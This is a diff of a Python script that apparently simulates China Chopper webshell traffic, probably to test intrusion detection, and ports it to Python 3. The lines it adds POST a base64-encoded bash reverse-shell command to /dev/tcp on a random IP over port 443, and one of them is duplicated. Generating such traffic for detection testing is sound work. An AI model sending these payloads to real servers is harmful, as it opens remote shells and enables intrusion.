@@ -60,13 +60,12 @@ def webshell_useing(url='http://127.0.0.1/'):
 def chopper_mock(url):
     requests.post(url,data=chopper[1],headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
     requests.post(url,data=chopper[2], headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
-    requests.post(url,data=chopper[3]+base64.b64encode('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1'), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[3]+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[3]+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
 def randomIP():
-    a= random.sample(range(1,256)*4, 4)
+    a= random.sample(list(range(1,256))*4, 4)
     b= map(str,a)
     return '.'.join(b)
-
-
 def Make():
     switch = {1:webshell_upload, 2:SQLI, 3:webshell_useing}
     mode=3
